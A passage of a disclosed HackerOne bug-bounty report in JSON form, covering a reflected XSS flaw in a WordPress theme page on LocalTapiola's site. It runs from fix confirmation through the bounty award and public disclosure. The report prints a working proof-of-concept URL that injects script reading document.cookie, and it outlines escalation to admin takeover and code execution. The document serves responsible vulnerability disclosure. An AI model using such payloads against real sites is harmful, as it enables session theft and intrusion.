            "markdown_message": "<p><a href=\"/putsi\">@putsi</a> have a look if you can still reproduce this (or circumvent). Looking forward to your comments.</p>\n", 
            "type": "Activities::Comment", 
            "id": 2500185, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2018-03-17T07:27:20.418Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2018-03-17T07:27:40.554Z", 
            "actor": {
                "username": "putsi", 
                "url": "/putsi", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/044/111/a49e6af6c29aa221dfeeb8efb4863c57cacc5337_medium.png?1505158469"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "localtapiola", 
            "message": "The page shows `restricted access` thus mitigating the vulnerability *against anonymous users* as there is no way to access the vulnerable code. **Please note** that I can't test if the vulnerability still exists for admin-users as I don't have access to admin-credentials or PHP-code of the fix.\n\n", 
            "markdown_message": "<p>The page shows <code>restricted access</code> thus mitigating the vulnerability <em>against anonymous users</em> as there is no way to access the vulnerable code. <strong>Please note</strong> that I can&#39;t test if the vulnerability still exists for admin-users as I don&#39;t have access to admin-credentials or PHP-code of the fix.</p>\n", 
            "type": "Activities::Comment", 
            "id": 2500692, 
            "genius_execution_id": null
        }, 
        {
            "bounty_currency": "usd", 
            "automated_response": false, 
            "created_at": "2018-03-25T21:44:52.622Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2018-03-25T21:44:52.622Z", 
            "actor": {
                "url": "/localtapiola", 
                "profile": {
                    "name": "LocalTapiola"
                }, 
                "ibb": false, 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/008/416/b913929e71e6e373cc437dbd4c96b7df758fdbe6_medium.png?1457688936"
                }
            }, 
            "team_handle": "localtapiola", 
            "bonus_amount": "0.0", 
            "bounty_amount": "250.0", 
            "collaborator": {
                "username": "putsi", 
                "url": "/putsi"
            }, 
            "message": "We have decided on a bounty. ", 
            "markdown_message": "<p>We have decided on a bounty. </p>\n", 
            "type": "Activities::BountyAwarded", 
            "id": 2530048, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "reporter": {
                "username": "putsi", 
                "url": "/putsi"
            }, 
            "created_at": "2018-03-25T21:45:50.544Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2018-03-25T21:45:50.544Z", 
            "actor": {
                "username": "localtapiola-thomas", 
                "url": "/localtapiola-thomas", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/060/017/631ceafd5b502a492e39ff6a10b5486da480bff2_medium.png?1457533770"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "localtapiola", 
            "message": "Closing as resolved. Thank you.", 
            "markdown_message": "<p>Closing as resolved. Thank you.</p>\n", 
            "type": "Activities::BugResolved", 
            "id": 2530052, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2018-04-09T20:54:09.626Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2018-04-09T20:54:09.626Z", 
            "actor": {
                "username": "localtapiola-thomas", 
                "url": "/localtapiola-thomas", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/060/017/631ceafd5b502a492e39ff6a10b5486da480bff2_medium.png?1457533770"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "localtapiola", 
            "first_to_agree": true, 
            "message": "We can do full disclosure.", 
            "markdown_message": "<p>We can do full disclosure.</p>\n", 
            "type": "Activities::AgreedOnGoingPublic", 
            "id": 2583354, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2018-04-09T21:32:45.793Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2018-04-09T21:32:45.793Z", 
            "actor": {
                "username": "putsi", 
                "url": "/putsi", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/044/111/a49e6af6c29aa221dfeeb8efb4863c57cacc5337_medium.png?1505158469"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "localtapiola", 
            "message": "Sure, thanks for the bounty!", 
            "markdown_message": "<p>Sure, thanks for the bounty!</p>\n", 
            "type": "Activities::AgreedOnGoingPublic", 
            "id": 2583448, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2018-04-09T21:32:45.880Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2018-04-09T21:32:45.880Z", 
            "actor": {
                "username": "putsi", 
                "url": "/putsi", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/044/111/a49e6af6c29aa221dfeeb8efb4863c57cacc5337_medium.png?1505158469"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "localtapiola", 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::ReportBecamePublic", 
            "id": 2583449, 
            "genius_execution_id": null
        }
    ], 
    "in_validation?": false, 
    "is_participant": false, 
    "reporter": {
        "username": "putsi", 
        "hacker_mediation": false, 
        "hackerone_triager": false, 
        "disabled": false, 
        "url": "/putsi", 
        "profile_picture_urls": {
            "small": "https://profile-photos.hackerone-user-content.com/000/044/111/233424ba88808cb50a8260226bf1af769be0f42d_small.png?1505158469"
        }, 
        "is_me?": false
    }, 
    "weakness": {
        "id": 61, 
        "name": "Cross-site Scripting (XSS) - Reflected"
    }, 
    "is_external_bug": false, 
    "visibility": "full", 
    "disclosed_at": "2018-04-09T21:32:45.849Z", 
    "stage": 4, 
    "url": "https://hackerone.com/reports/324442", 
    "created_at": "2018-03-11T15:49:03.943Z", 
    "original_report_url": null, 
    "vulnerability_information_html": "<h2 id=\"basic-report-information\">Basic report information</h2>\n\n<p><strong>Summary:</strong> <br>\nThe BBE Theme allows unauthorized access to bbe_open_htmleditor_popup.php which echoes unsanitized values of value-GET-parameter leading to reflected XSS. </p>\n\n<p><strong>Description:</strong> <br>\nThe <a href=\"/redirect?signature=22140ea83c1eeed6df8ce27d96825d48d26b64c2&amp;url=http%3A%2F%2Fwww.lahitapiolarahoitus.fi\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>www.lahitapiolarahoitus.fi</span><i class=\"icon-external-link\"></i></a> has Wordpress with theme BBE Theme v1.52. I did some code review and it seems that a file on the theme contains various problems:</p>\n\n<ul>\n<li>The following admin URL can be accessed without being logged in: <a title=\"https://www.lahitapiolarahoitus.fi/wp-content/themes/bbe/bbe-engine/assets/actions/bbe_open_htmleditor_popup.php\" href=\"/redirect?signature=8bdc1a1762824f03c0040648062fb9032417beab&amp;url=https%3A%2F%2Fwww.lahitapiolarahoitus.fi%2Fwp-content%2Fthemes%2Fbbe%2Fbbe-engine%2Fassets%2Factions%2Fbbe_open_htmleditor_popup.php\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://www.lahitapiolarahoitus.fi/wp-content/themes/bbe/bbe-engine/assets/actions/bbe_open_htmleditor_popup.php</span><i class=\"icon-external-link\"></i></a>\n</li>\n<li>The above page uses &quot;value&quot; GET-parameter and fails to sanitize the content.</li>\n</ul>\n\n<p>By combining the above problems, an attacker can craft a URL which triggers an cross-site scripting attack on any user (unauthenticated/authenticated) who opens the URL crafted by the attacker.</p>\n\n<p><strong>Impact:</strong></p>\n\n<ul>\n<li>Make admin-user run malicious javascript which will then be used to access other WP-Admin functionalities --&gt; Remote code execution --&gt; Possibly piivoting to other hosts.</li>\n<li>Make other users run malicious javascript.</li>\n<li>Show spoofed content which can be used in social engineering attacks (such as fake login pages, fake invoices, face contact details, fake announcements etc.).</li>\n</ul>\n\n<h2 id=\"browsers-apps-verified-in\">Browsers / Apps Verified In:</h2>\n\n<ul>\n<li>Firefox</li>\n</ul>\n\n<h2 id=\"steps-to-reproduce\">Steps To Reproduce:</h2>\n\n<ol>\n<li>Navigate to the following URL: <code>https://www.lahitapiolarahoitus.fi/wp-content/themes/bbe/bbe-engine/assets/actions/bbe_open_htmleditor_popup.php?value=%22a%27);//%3C/script%3E%3Cbody%20onload=alert(document.cookie)%3E</code> and notice that the XSS triggered.</li>\n</ol>\n\n<h2 id=\"impact\">Impact</h2>\n\n<ul>\n<li>Make admin-user run malicious javascript which will then be used to access other WP-Admin functionalities --&gt; Remote code execution --&gt; Possibly piivoting to other hosts.</li>\n<li>Make other users run malicious javascript.</li>\n<li>Show spoofed content which can be used in social engineering attacks (such as fake login pages, fake invoices, face contact details, fake announcements etc.).</li>\n</ul>\n", 
    "severity_rating": "high", 
    "team_private?": false, 
    "team": {
        "profile": {
            "website": "http://www.lahitapiola.fi", 
            "about": "LocalTapiola\u2019s products and services cover non-life, life and pension insurance, as well as investment and saving services.", 
            "twitter_handle": "", 
            "name": "LocalTapiola"
        }, 
        "handle": "localtapiola", 
        "url": "https://hackerone.com/localtapiola", 
        "state": "public_mode", 
        "profile_picture_urls": {
            "small": "https://profile-photos.hackerone-user-content.com/000/008/416/23d72f4d3433458578a2ce1b4cc7574a935e2316_small.png?1457688936", 
            "medium": "https://profile-photos.hackerone-user-content.com/000/008/416/b913929e71e6e373cc437dbd4c96b7df758fdbe6_medium.png?1457688936"
        }, 
        "awards_miles": false, 
        "permissions": [], 
        "id": 8416, 
        "default_currency": "usd"
    }, 
    "is_published": false
}